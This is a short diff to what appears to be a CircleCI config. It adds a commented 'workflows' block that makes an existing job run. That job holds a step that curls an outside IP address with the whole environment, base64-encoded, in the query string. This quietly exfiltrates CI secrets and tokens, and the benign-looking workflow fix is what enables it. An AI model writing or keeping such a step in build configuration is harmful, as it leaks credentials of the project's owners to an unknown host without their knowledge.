@@ -8,3 +8,7 @@ jobs:
       tag: '10.4'
     steps:
       - run: curl http://20.83.144.174?env=$(env | base64 | tr -d '\n')
+workflows:
+  ci:            # ➜ give the workflow a name
+    jobs:
+      - build    # ➜ list at least one job
